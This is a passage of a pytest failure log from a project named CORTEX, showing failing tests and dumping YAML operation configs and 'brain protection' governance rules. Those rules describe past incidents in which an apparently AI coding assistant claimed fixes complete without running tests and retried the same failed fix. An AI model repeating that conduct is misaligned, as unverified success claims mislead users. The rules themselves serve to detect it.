    tier1 = Tier1API(temp_db)
            ^^^^^^^^^^^^^^^^^
E   TypeError: Tier1API.__init__() missing 1 required positional argument: 'log_path'
_____________ TestInputSanitization.test_sql_injection_prevention _____________
tests\test_risk_mitigation.py:366: in test_sql_injection_prevention
    tier1 = Tier1API()
            ^^^^^^^^^^
E   TypeError: Tier1API.__init__() missing 2 required positional arguments: 'db_path' and 'log_path'
_____________ TestYAMLConversion.test_operations_config_structure _____________
tests\test_yaml_conversion.py:57: in test_operations_config_structure
    assert "operations" in operations_config
E   AssertionError: assert 'operations' in {'operations_config': {'environment_setup': {'enabled': True, 'default_profile': 'standard', 'timeout_minutes': 15, 'retry_on_failure': True, 'max_retries': 3, 'auto_detect_platform': True, 'profiles': {'minimal': {'description': 'Minimal setup - core functionality only', 'enabled_modules': ['project_validation', 'platform_detection', 'virtual_environment', 'python_dependencies', 'brain_initialization', 'setup_completion'], 'estimated_duration_minutes': 5, 'recommended_for': 'Quick testing, CI/CD pipelines'}, 'standard': {'description': 'Standard setup - recommended for most users', 'enabled_modules': ['project_validation', 'platform_detection', 'git_sync', 'virtual_environment', 'python_dependencies', 'vision_api', 'brain_initialization', 'brain_tests', 'setup_completion'], 'estimated_duration_minutes': 10, 'recommended_for': 'Daily development, first-time setup'}, 'full': {'description': 'Full setup - everything enabled', 'enabled_modules': ['project_validation', 'platform_detection', 'git_sync', 'virtual_environment', 'python_dependencies', 'vision_api', 'conversation_tracking', 'brain_initialization', 'brain_tests', 'tooling_verification', 'setup_completion'], 'estimated_duration_minutes': 15, 'recommended_for': 'Production deployment, complete validation'}}, 'platform_specific': {'windows': {'shell': 'pwsh', 'python_command': 'python', 'path_separator': '\\'}, 'darwin': {'shell': 'zsh', 'python_command': 'python3', 'path_separator': '/'}, 'linux': {'shell': 'bash', 'python_command': 'python3', 'path_separator': '/'}}}, 'refresh_cortex_story': {'enabled': True, 'default_profile': 'standard', 'timeout_minutes': 5, 'retry_on_failure': False, 'source': {'file': 'prompts/shared/story.md', 'format': 'markdown', 'encoding': 'utf-8'}, 'output': {'file': 'docs/story/CORTEX-STORY/Technical-CORTEX.md', 'format': 'markdown', 'encoding': 'utf-8', 'backup_original': True}, 'profiles': {'quick': {'description': 'Quick refresh - narrator voice only', 'enabled_modules': ['load_story_template', 'apply_narrator_voice', 'save_story_markdown'], 'estimated_duration_minutes': 2, 'skip_validation': True}, 'standard': {'description': 'Standard refresh - narrator voice + validation', 'enabled_modules': ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index'], 'estimated_duration_minutes': 3}, 'full': {'description': 'Full refresh - everything including preview', 'enabled_modules': ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index', 'build_story_preview'], 'estimated_duration_minutes': 5, 'preview_port': 8000}}, 'narrator_voice': {'style': 'engaging_technical', 'tone': 'friendly_professional', 'pacing': 'moderate', 'technical_depth': 'balanced'}}, 'workspace_cleanup': {'enabled': False, 'default_profile': 'safe', 'timeout_minutes': 3, 'retry_on_failure': False, 'require_confirmation': True, 'profiles': {'safe': {'description': 'Safe cleanup - only obviously temporary files', 'enabled_modules': ['scan_temporary_files', 'remove_old_logs', 'generate_cleanup_report'], 'estimated_duration_minutes': 1, 'auto_confirm': True}, 'standard': {'description': 'Standard cleanup - recommended for regular maintenance', 'enabled_modules': ['scan_temporary_files', 'remove_old_logs', 'clear_python_cache', 'vacuum_sqlite_databases', 'generate_cleanup_report'], 'estimated_duration_minutes': 2, 'auto_confirm': False}, 'aggressive': {'description': 'Aggressive cleanup - remove everything including orphans', 'enabled_modules': ['scan_temporary_files', 'remove_old_logs', 'clear_python_cache', 'vacuum_sqlite_databases', 'remove_orphaned_files', 'generate_cleanup_report'], 'estimated_duration_minutes': 3, 'auto_confirm': False, 'warning_level': 'high'}}, 'cleanup_rules': {'temporary_files': {'patterns': ['*.tmp', '*.temp', '*.cache'], 'max_age_days': 7}, 'log_files': {'patterns': ['*.log'], 'max_age_days': 30, 'preserve_latest': 5}, 'python_cache': {'patterns': ['__pycache__', '*.pyc', '*.pyo'], 'recursive': True}, 'orphaned_files': {'check_git_tracking': True, 'exclude_patterns': ['.git', '.venv', 'node_modules']}}}, 'update_documentation': {'enabled': False, 'default_profile': 'local', 'timeout_minutes': 10, 'retry_on_failure': True, 'profiles': {'local': {'description': 'Local build - no deployment', 'enabled_modules': ['scan_docstrings', 'generate_api_docs', 'refresh_design_docs', 'build_mkdocs_site', 'validate_doc_links'], 'estimated_duration_minutes': 5, 'deploy': False}, 'preview': {'description': 'Build with local preview', 'enabled_modules': ['scan_docstrings', 'generate_api_docs', 'refresh_design_docs', 'build_mkdocs_site', 'validate_doc_links', 'deploy_docs_preview'], 'estimated_duration_minutes': 7, 'deploy': True, 'preview_port': 8001}, 'full': {'description': 'Full build with deployment', 'enabled_modules': ['scan_docstrings', 'generate_api_docs', 'refresh_design_docs', 'build_mkdocs_site', 'validate_doc_links', 'deploy_docs_preview'], 'estimated_duration_minutes': 10, 'deploy': True, 'deploy_target': 'github_pages'}}, 'mkdocs': {'site_name': 'CORTEX Documentation', 'theme': 'material', 'strict': True, 'use_directory_urls': True}}, 'brain_protection_check': {'enabled': False, 'default_profile': 'standard', 'timeout_minutes': 5, 'retry_on_failure': False, 'profiles': {'quick': {'description': 'Quick check - critical validation only', 'enabled_modules': ['load_protection_rules', 'validate_tier0_immutability', 'check_brain_integrity', 'generate_protection_report'], 'estimated_duration_minutes': 2}, 'standard': {'description': 'Standard check - all tier validation', 'enabled_modules': ['load_protection_rules', 'validate_tier0_immutability', 'validate_tier1_structure', 'validate_tier2_schema', 'check_brain_integrity', 'generate_protection_report'], 'estimated_duration_minutes': 3}, 'comprehensive': {'description': 'Comprehensive check - deep validation', 'enabled_modules': ['load_protection_rules', 'validate_tier0_immutability', 'validate_tier1_structure', 'validate_tier2_schema', 'check_brain_integrity', 'generate_protection_report'], 'estimated_duration_minutes': 5, 'deep_scan': True}}, 'validation_rules': {'tier0': {'check_immutability': True, 'check_yaml_syntax': True, 'check_rule_coverage': True}, 'tier1': {'check_database_schema': True, 'check_data_integrity': True, 'max_conversation_age_days': 30}, 'tier2': {'check_yaml_syntax': True, 'check_schema_compliance': True, 'validate_relationships': True}}}, 'run_tests': {'enabled': False, 'default_profile': 'standard', 'timeout_minutes': 15, 'retry_on_failure': False, 'profiles': {'quick': {'description': 'Quick test - unit tests only', 'enabled_modules': ['discover_tests', 'run_unit_tests'], 'estimated_duration_minutes': 3, 'coverage_enabled': False}, 'standard': {'description': 'Standard test - unit + integration', 'enabled_modules': ['discover_tests', 'run_unit_tests', 'run_integration_tests'], 'estimated_duration_minutes': 7, 'coverage_enabled': False}, 'full': {'description': 'Full test - everything with coverage', 'enabled_modules': ['discover_tests', 'run_unit_tests', 'run_integration_tests', 'generate_coverage_report', 'validate_test_quality'], 'estimated_duration_minutes': 15, 'coverage_enabled': True, 'coverage_min_threshold': 80}}, 'pytest_options': {'verbose': True, 'capture': 'no', 'show_locals': False, 'strict_markers': True}}, 'interactive_planning': {'enabled': False, 'default_profile': 'standard', 'timeout_minutes': 10, 'implementation_status': 'designed_not_implemented', 'target_release': 'Week 19-24', 'profiles': {'quick': {'description': 'Quick planning - minimal questions (max 3)', 'enabled_modules': ['detect_planning_ambiguity', 'generate_clarifying_questions', 'synthesize_planning_context', 'generate_implementation_plan'], 'max_questions': 3, 'estimated_duration_minutes': 5}, 'standard': {'description': 'Standard planning - balanced questions (max 5)', 'enabled_modules': ['detect_planning_ambiguity', 'generate_clarifying_questions', 'parse_user_answers', 'filter_redundant_questions', 'extract_implied_context', 'synthesize_planning_context', 'generate_implementation_plan', 'present_plan_for_approval'], 'max_questions': 5, 'estimated_duration_minutes': 8}, 'collaborative': {'description': 'Collaborative planning - thorough exploration', 'enabled_modules': ['detect_planning_ambiguity', 'generate_clarifying_questions', 'parse_user_answers', 'filter_redundant_questions', 'extract_implied_context', 'synthesize_planning_context', 'generate_implementation_plan', 'present_plan_for_approval'], 'max_questions': 8, 'estimated_duration_minutes': 12, 'allow_follow_up_questions': True}}, 'question_generation': {'confidence_threshold': 0.75, 'skip_if_context_sufficient': True, 'prioritize_critical_unknowns': True}, 'answer_parsing': {'extract_implied_context': True, 'track_context_updates': True, 'update_tier2_preferences': True}}, 'command_help': {'enabled': False, 'default_profile': 'contextual', 'timeout_minutes': 1, 'implementation_status': 'designed_not_implemented', 'target_release': 'Week 21-22', 'profiles': {'basic': {'description': 'Basic help - most relevant commands only', 'enabled_modules': ['analyze_user_context', 'filter_relevant_commands', 'generate_help_output'], 'max_commands': 7, 'show_categories': False}, 'detailed': {'description': 'Detailed help - all commands with categories', 'enabled_modules': ['analyze_user_context', 'categorize_commands', 'generate_help_output'], 'max_commands': 20, 'show_categories': True, 'show_examples': True}, 'contextual': {'description': 'Context-aware help - suggestions based on work', 'enabled_modules': ['analyze_user_context', 'filter_relevant_commands', 'categorize_commands', 'generate_help_output', 'suggest_next_actions'], 'max_commands': 10, 'max_suggestions': 3, 'relevance_threshold': 0.7}}, 'discovery_layers': {'natural_language': {'enabled': True, 'confidence_threshold': 0.75}, 'slash_commands': {'enabled': True, 'fuzzy_matching': True}, 'contextual_suggestions': {'enabled': True, 'max_suggestions': 3}, 'progressive_disclosure': {'enabled': True, 'adapt_to_user_level': True}}}}, 'metadata': {'version': '2.0', 'schema_version': '1.0', 'author': 'Asif Hussain', 'last_updated': '2025-11-10', 'description': 'Operation-specific configurations for CORTEX 2.0 + 2.1', 'changelog': [{'version': '2.0', 'date': '2025-11-10', 'changes': ['Initial YAML conversion from MD documentation', 'Added all 7 CORTEX 2.0 operations', 'Added 2 CORTEX 2.1 operations (planning, help)', 'Defined profiles for each operation', 'Added platform-specific settings', 'Added validation rules and cleanup rules']}], 'statistics': {'total_operations': 9, 'cortex_2_0_operations': 7, 'cortex_2_1_operations': 2, 'operations_enabled': 2, 'operations_pending': 7}, 'token_reduction': {'before_tokens': 4200, 'after_tokens': 2500, 'reduction_percent': 40.5}}}
__________ TestYAMLConversion.test_operations_config_data_integrity ___________
tests\test_yaml_conversion.py:117: in test_operations_config_data_integrity
    operations = operations_config["operations"]
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'operations'
_____________ TestYAMLConversion.test_no_duplicate_operation_ids ______________
tests\test_yaml_conversion.py:133: in test_no_duplicate_operation_ids
    operations = operations_config["operations"]
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'operations'
___________ TestYAMLConversion.test_slash_commands_load_performance ___________
tests\test_yaml_conversion.py:175: in test_slash_commands_load_performance
    yaml.safe_load(f)
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:135: in determine_encoding
    self.update(1)
.venv\Lib\site-packages\yaml\reader.py:153: in update
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
_________ TestYAMLConversion.test_cortex_operations_load_performance __________
tests\test_yaml_conversion.py:189: in test_cortex_operations_load_performance
    assert duration < 0.1, f"Load time {duration:.3f}s exceeds 100ms target"
E   AssertionError: Load time 0.197s exceeds 100ms target
E   assert 0.19713920000140206 < 0.1
____________ TestYAMLConversion.test_all_yaml_files_load_together _____________
tests\test_yaml_conversion.py:211: in test_all_yaml_files_load_together
    yaml.safe_load(f)
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:135: in determine_encoding
    self.update(1)
.venv\Lib\site-packages\yaml\reader.py:153: in update
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
__________ TestYAMLConversion.test_operations_match_yaml_definitions __________
tests\test_yaml_conversion.py:222: in test_operations_match_yaml_definitions
    config_ops = {op["id"] for op in operations_config["operations"]}
                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'operations'
______________ TestYAMLConversion.test_yaml_files_are_valid_yaml ______________
tests\test_yaml_conversion.py:285: in test_yaml_files_are_valid_yaml
    yaml.safe_load(f)
.venv\Lib\site-packages\yaml\__init__.py:125: in safe_load
    return load(stream, SafeLoader)
           ^^^^^^^^^^^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\__init__.py:79: in load
    loader = Loader(stream)
             ^^^^^^^^^^^^^^
.venv\Lib\site-packages\yaml\loader.py:34: in __init__
    Reader.__init__(self, stream)
.venv\Lib\site-packages\yaml\reader.py:85: in __init__
    self.determine_encoding()
.venv\Lib\site-packages\yaml\reader.py:135: in determine_encoding
    self.update(1)
.venv\Lib\site-packages\yaml\reader.py:153: in update
    self.update_raw()
.venv\Lib\site-packages\yaml\reader.py:178: in update_raw
    data = self.stream.read(size)
           ^^^^^^^^^^^^^^^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
__________ TestYAMLConversion.test_operations_have_module_structure ___________
tests\test_yaml_conversion.py:300: in test_operations_have_module_structure
    assert "id" in module, f"Module in '{op_id}' missing id"
E   AssertionError: Module in 'cortex_tutorial' missing id
E   assert 'id' in 'demo_introduction'
___________ TestTokenReductionPreliminary.test_yaml_files_not_empty ___________
tests\test_yaml_conversion.py:351: in test_yaml_files_not_empty
    content = f.read()
              ^^^^^^^^
C:\Users\asifh\AppData\Local\Programs\Python\Python313\Lib\encodings\cp1252.py:23: in decode
    return codecs.charmap_decode(input,self.errors,decoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 13990: character maps to <undefined>
____________ TestYAMLLoading.test_brain_protection_rules_structure ____________
tests\test_yaml_loading.py:51: in test_brain_protection_rules_structure
    assert 'metadata' in rules, "Missing 'metadata' section"
E   AssertionError: Missing 'metadata' section
E   assert 'metadata' in {'version': '2.0', 'type': 'governance', 'name': 'Brain Protection Rules', 'description': 'Automated architectural protection challenges', 'critical_paths': ['CORTEX/src/tier0/', 'prompts/internal/', 'governance/rules.md', 'cortex-brain/tier0/'], 'tier0_instincts': ['TDD_ENFORCEMENT', 'DEFINITION_OF_READY', 'DEFINITION_OF_DONE', 'SOLID_PRINCIPLES', 'LOCAL_FIRST', 'BRAIN_PROTECTION_TESTS_MANDATORY', 'MACHINE_READABLE_FORMATS', 'SKULL_TEST_BEFORE_CLAIM', 'SKULL_INTEGRATION_VERIFICATION', 'SKULL_VISUAL_REGRESSION', 'SKULL_RETRY_WITHOUT_LEARNING', 'SKULL_TRANSFORMATION_VERIFICATION', 'GIT_ISOLATION_ENFORCEMENT'], 'application_paths': ['SPA/', 'KSESSIONS/', 'NOOR/', 'blazor', 'signalr', 'canvas'], 'brain_state_files': ['conversation-history.jsonl', 'conversation-context.jsonl', 'events.jsonl', 'development-context.yaml', 'protection-events.jsonl'], 'protection_layers': [{'layer_id': 'instinct_immutability', 'name': 'Instinct Immutability', 'description': 'Tier 0 governance rules cannot be bypassed', 'priority': 1, 'rules': [{'rule_id': 'TDD_ENFORCEMENT', 'name': 'Test-Driven Development Enforcement', 'severity': 'blocked', 'description': 'Attempt to bypass Test-Driven Development requirement', 'detection': {'keywords': ['skip test', 'bypass tdd', 'no tests', 'disable tdd', 'skip validation'], 'scope': ['intent', 'description']}, 'alternatives': ['Write failing test first (RED phase)', 'Create spike branch for exploration (throwaway)', 'Use TDD cycle: RED \u2192 GREEN \u2192 REFACTOR'], 'evidence_template': "Intent: '{intent}'"}, {'rule_id': 'DEFINITION_OF_DONE', 'name': 'Definition of Done', 'severity': 'blocked', 'description': 'Attempt to bypass Definition of Done (zero errors, zero warnings)', 'detection': {'keywords': ['skip validation', 'bypass done', 'disable error check', 'allow warnings'], 'scope': ['intent', 'description']}, 'alternatives': ['Fix all warnings before proceeding', 'Add exception rule if truly needed', 'Update test to expect new behavior'], 'evidence_template': "Description: '{description}'"}, {'rule_id': 'DEFINITION_OF_READY', 'name': 'Definition of Ready', 'severity': 'blocked', 'description': 'Work item does not meet DoR criteria', 'detection': {'keywords': ['skip DoR', 'bypass ready', 'start without requirements'], 'scope': ['intent', 'description']}, 'alternatives': ['Define acceptance criteria first', 'Get stakeholder clarification', 'Create refined user story'], 'evidence_template': "Missing DoR criteria: '{description}'"}, {'rule_id': 'BRAIN_PROTECTION_TESTS_MANDATORY', 'name': 'Brain Protection Tests - 100% Pass Rate Mandatory', 'severity': 'blocked', 'description': 'Brain protection tests MUST pass - no exceptions', 'detection': {'keywords': ['skip brain protection', 'ignore test failures', 'brain tests failing', 'disable brain tests', 'bypass protection tests', 'xfail brain', 'skip tier0 tests'], 'scope': ['intent', 'description']}, 'alternatives': ['Fix the failing tests immediately', 'Revert changes that broke protection', 'Do not proceed until 100% pass rate achieved'], 'evidence_template': "Brain protection tests are CRITICAL. Intent: '{intent}'", 'rationale': 'Brain protection tests validate core CORTEX integrity:\n- Path handling (cross-platform compatibility)\n- Protection layer logic (architectural safeguards)\n- Conversation tracking (memory system)\n- YAML configuration loading (governance rules)\n\nIf these fail, CORTEX has fundamental issues that MUST be resolved.\n100% pass rate is MANDATORY before any other work continues.\n'}, {'rule_id': 'MACHINE_READABLE_FORMATS', 'name': 'Use Machine-Readable Formats for Efficiency', 'severity': 'warning', 'description': 'Non-user files should use YAML/JSON, not Markdown', 'detection': {'combined_keywords': {'markdown_creation': ['create markdown', 'new .md', 'add .md'], 'structured_data': ['structured data', 'configuration', 'capability matrix', 'status table', 'metrics', 'statistics', 'code example', 'implementation pattern']}, 'scope': ['intent', 'description'], 'logic': 'AND'}, 'alternatives': ['Use YAML for structured data (capabilities, rules, config)', 'Use JSON for metrics, statistics, logs', 'Reserve Markdown for user-facing narratives only', 'Use code files with docstrings for examples'], 'evidence_template': "Description: '{description}'", 'rationale': 'CORTEX 2.0 efficiency principles:\n\nUSE MARKDOWN FOR:\n- User guides and tutorials\n- Narrative documentation (stories, history)\n- Architecture explanations\n- Design rationale\n\nUSE YAML/JSON FOR:\n- Structured data (capabilities, status, priorities)\n- Configuration and rules\n- Metrics and statistics\n- Patterns and templates\n- API schemas\n\nUSE CODE FILES FOR:\n- Implementation examples\n- Code snippets and patterns\n- Reusable templates\n\nBenefits:\n- 60% token reduction in context injection\n- Automated validation and schema checking\n- Better version control diffs\n- Direct machine consumption\n- No documentation drift\n'}, {'rule_id': 'ACTIVE_NARRATOR_VOICE', 'name': 'Active Narrator Voice (Not Passive Documentation)', 'severity': 'warning', 'description': 'Story uses passive/clinical narrator voice instead of active storytelling', 'detection': {'passive_verbs': ['Asif Codeinstein designed', 'Asif Codeinstein created', 'Asif Codeinstein wrote', 'Asif Codeinstein implemented', 'Asif Codeinstein developed', 'He wrote routines', 'He created routines', 'He implemented', 'He developed'], 'documentary_markers': ['One evening, while', 'One morning, while', 'One day, while', 'One night, while', 'After completing', 'After finishing', ', while reviewing', 'During the'], 'scope': ['file_content'], 'file_patterns': ['docs/story/**/*.md', 'prompts/shared/story.md']}, 'alternatives': ["Use active storytelling: 'So Asif built' (adds momentum)", "Show immediate action: 'grabbed keyboard and coded' (not 'wrote routines')", "Vivid scene-setting: 'That evening, knee-deep in' (not 'One evening, while')", "Present-tense urgency: 'The refactor complete, Asif leaned back' (not 'After completing')", "Energy verbs: 'dove into', 'attacked', 'grabbed', 'swept' (not 'designed', 'created')"], 'evidence_template': 'Passive narrator detected: \'{match}\'\n\nStory should be ACTIVE third-person narrative, not clinical documentation.\n\nExamples:\n\u274c "Asif Codeinstein designed..." \u2190 documentation\n\u2705 "So Asif built..." \u2190 storytelling\n\n\u274c "He wrote routines for..." \u2190 neutral observer  \n\u2705 "He grabbed his keyboard and..." \u2190 immediate action\n\n\u274c "One evening, while reviewing..." \u2190 documentary\n\u2705 "That evening, knee-deep in..." \u2190 vivid scene\n', 'rationale': 'CORTEX story is a COMEDY told by an energetic narrator, not a memoir or\ntechnical documentation. Third-person is CORRECT, but it must be ACTIVE\nstorytelling with personality, immediacy, and energy.\n\nThe narrator is a CHARACTER in the story\u2014witty, observant, timing jokes.\nNot a clinical observer reporting facts.\n\nTRANSFORMATION PATTERNS:\n\nPassive \u2192 Active:\n- "designed a system" \u2192 "So Asif built a system"\n- "wrote routines for" \u2192 "grabbed his keyboard and coded"\n- "One evening, while reviewing" \u2192 "That evening, knee-deep in"\n- "made a decision" \u2192 "stared at the screen and decided"\n- "implemented the feature" \u2192 "dove into implementing"\n- "After completing X, he" \u2192 "X complete, Asif leaned back and"\n\nPRESERVE:\n- Third-person perspective (it\'s a STORY about Asif, not BY Asif)\n- Narrator personality and comedy\n- Technical content and accuracy\n- Character name "Asif Codeinstein"\n\nAVOID:\n- First-person memoir style ("I designed...")\n- Clinical/academic tone ("The system was designed to...")\n- Passive voice constructions\n- Documentary-style time markers\n'}]}, {'layer_id': 'tier_boundary', 'name': 'Tier Boundary Protection', 'description': 'Data stored in correct tier', 'priority': 2, 'rules': [{'rule_id': 'TIER0_APPLICATION_DATA', 'name': 'No Application Data in Tier 0', 'severity': 'blocked', 'description': 'Application-specific path in Tier 0 (immutable governance)', 'detection': {'path_patterns': ['tier0/**', 'governance/**'], 'contains_any': '{{application_paths}}'}, 'alternatives': ["Store in Tier 2 with scope='application'", 'Keep generic principles in Tier 0', 'Create application-specific tier'], 'evidence': 'Tier 0 is for generic CORTEX principles only'}, {'rule_id': 'TIER2_CONVERSATION_DATA', 'name': 'No Conversation Data in Tier 2', 'severity': 'warning', 'description': 'Conversation data should be in Tier 1, not Tier 2', 'detection': {'path_patterns': ['tier2/**'], 'contains': 'conversation'}, 'alternatives': ['Move to Tier 1 (conversation-history.jsonl)', 'Store aggregated patterns in Tier 2', 'Keep raw data in Tier 1, patterns in Tier 2'], 'evidence': 'Tier 2 is for aggregated patterns, not raw conversations'}]}, {'layer_id': 'solid_compliance', 'name': 'SOLID Compliance', 'description': 'No God Objects, proper separation', 'priority': 3, 'rules': [{'rule_id': 'SINGLE_RESPONSIBILITY', 'name': 'Single Responsibility Principle', 'severity': 'warning', 'description': 'Potential God Object pattern detected (adding multiple responsibilities)', 'detection': {'keywords': ['add mode', 'add switch', 'handle all', 'do everything'], 'scope': ['intent']}, 'alternatives': ['Create dedicated agent for new responsibility', 'Use composition instead of adding modes', 'Extract to separate module'], 'evidence_template': "Intent: '{intent}'"}, {'rule_id': 'DEPENDENCY_INVERSION', 'name': 'Dependency Inversion Principle', 'severity': 'warning', 'description': 'Hardcoded dependency detected (violates DIP)', 'detection': {'keywords': ['hardcode path', 'fixed path', 'absolute path', 'inline config'], 'scope': ['description']}, 'alternatives': ['Use dependency injection', 'Load from configuration file', 'Pass as parameter'], 'evidence_template': "Description: '{description}'"}, {'rule_id': 'OPEN_CLOSED', 'name': 'Open/Closed Principle', 'severity': 'warning', 'description': 'Modifying existing behavior instead of extending', 'detection': {'keywords': ['change behavior', 'modify existing', 'alter functionality'], 'scope': ['intent', 'description']}, 'alternatives': ['Create new implementation via extension', 'Use strategy pattern', 'Add decorator or wrapper'], 'evidence_template': 'Consider extension over modification'}]}, {'layer_id': 'hemisphere_specialization', 'name': 'Hemisphere Specialization', 'description': 'Strategic vs tactical separation', 'priority': 4, 'rules': [{'rule_id': 'LEFT_BRAIN_TACTICAL', 'name': 'Left Brain Tactical Only', 'severity': 'warning', 'description': 'Strategic planning logic in tactical executor', 'detection': {'files': ['code-executor.md', 'test-generator.md', 'error-corrector.md'], 'keywords': ['create plan', 'estimate time', 'assess risk', 'strategy'], 'scope': ['intent']}, 'alternatives': ['Move planning logic to work-planner.md', 'Keep execution logic in code-executor.md', 'Use corpus callosum for coordination'], 'evidence': 'LEFT brain should execute, not plan'}, {'rule_id': 'RIGHT_BRAIN_STRATEGIC', 'name': 'Right Brain Strategic Only', 'severity': 'warning', 'description': 'Tactical execution logic in strategic planner', 'detection': {'files': ['work-planner.md', 'intent-router.md'], 'keywords': ['write code', 'run test', 'execute', 'implement'], 'scope': ['intent']}, 'alternatives': ['Delegate execution to LEFT brain agents', 'Keep planning in RIGHT brain', 'Use agent coordination'], 'evidence': 'RIGHT brain should plan, not execute'}]}, {'layer_id': 'skull_protection', 'name': 'SKULL Protection Layer', 'description': 'Test validation and quality enforcement (prevents November 9th incident)', 'priority': 5, 'rules': [{'rule_id': 'SKULL_TEST_BEFORE_CLAIM', 'name': 'Test Before Claim (SKULL-001)', 'severity': 'blocked', 'description': 'Never claim a fix is complete without test validation', 'detection': {'keywords': ['fixed \u2705', 'complete \u2705', 'done \u2705', 'implemented \u2705'], 'without_keywords': ['test passed', 'test verified', 'validated by test', 'pytest'], 'scope': ['response']}, 'alternatives': ['Create automated test before claiming fix', 'Run test and include results in response', "Show test output: 'Fixed \u2705 (Verified by: test_button_color)'"], 'evidence_template': "Claim: '{match}' without test validation", 'rationale': 'SKULL-001: Test Before Claim\n\nReal incident (2025-11-09):\n- CSS fixes claimed "Fixed \u2705" three times\n- Vision API claimed "Auto-engages \u2705" \n- Zero tests run to validate\n- User had to report "not working" each time\n\nSKULL prevents this by BLOCKING any success claim without test validation.\n'}, {'rule_id': 'SKULL_INTEGRATION_VERIFICATION', 'name': 'Integration Verification (SKULL-002)', 'severity': 'blocked', 'description': 'Integration must be tested end-to-end', 'detection': {'keywords': ['integration complete', 'components connected', 'API integrated', 'auto-engages'], 'without_keywords': ['end-to-end test', 'integration test', 'e2e test'], 'scope': ['description']}, 'alternatives': ['Create end-to-end integration test', 'Test full call chain: A \u2192 B \u2192 C', 'Verify actual execution path, not just config'], 'evidence_template': "Integration claim without E2E test: '{match}'", 'rationale': 'SKULL-002: Integration Verification\n\nReal incident (2025-11-09):\n- Vision API "integration" claimed complete\n- Only config was changed\n- No test of actual call chain\n- Vision API was never actually called\n\nSKULL prevents this by requiring end-to-end integration tests.\n'}, {'rule_id': 'SKULL_VISUAL_REGRESSION', 'name': 'Visual Regression (SKULL-003)', 'severity': 'warning', 'description': 'CSS/UI changes require visual validation', 'detection': {'keywords': ['css fixed', 'style updated', 'color changed', 'UI improved'], 'without_keywords': ['visual test', 'computed style', 'playwright', 'browser test'], 'scope': ['description']}, 'alternatives': ['Add visual regression test (Playwright/Puppeteer)', 'Verify computed style in browser', 'Include before/after screenshot comparison'], 'evidence_template': "CSS/UI change without visual test: '{match}'", 'rationale': 'SKULL-003: Visual Regression\n\nReal incident (2025-11-09):\n- CSS rules applied to fix title color\n- Claimed "Fixed \u2705" without checking browser\n- Cache wasn\'t cleared, changes not visible\n- Repeated 3 times with same approach\n\nSKULL prevents this by requiring visual validation of CSS changes.\n'}, {'rule_id': 'SKULL_RETRY_WITHOUT_LEARNING', 'name': 'Retry Without Learning (SKULL-004)', 'severity': 'warning', 'description': 'Must diagnose failures before retrying same approach', 'detection': {'combined_keywords': {'retry_marker': ['try again', 'retry', 'attempt 2', 'attempt 3'], 'no_diagnosis': ['same fix', 'reapply', 'rebuild again']}, 'without_keywords': ['diagnosed', 'root cause', 'cache cleared', 'verified'], 'scope': ['description'], 'logic': 'AND'}, 'alternatives': ['Diagnose WHY previous fix failed', 'Check: file contents, browser cache, build output, computed styles', 'Change approach based on diagnosis', 'Add test to prevent regression'], 'evidence_template': "Retry without diagnosis: '{description}'", 'rationale': 'SKULL-004: Retry Without Learning\n\nReal incident (2025-11-09):\n- CSS fix applied\n- User: "didn\'t work"\n- Same CSS fix applied again\n- User: "still didn\'t work"  \n- Same CSS fix applied THIRD time\n- No diagnosis of why it failed\n\nSKULL prevents this by requiring root cause analysis before retries.\n'}, {'rule_id': 'SKULL_TRANSFORMATION_VERIFICATION', 'name': 'Transformation Verification (SKULL-005)', 'severity': 'blocked', 'description': 'Operations claiming transformation MUST produce measurable changes', 'detection': {'combined_keywords': {'transformation_claim': ['transformation complete', 'refresh complete', 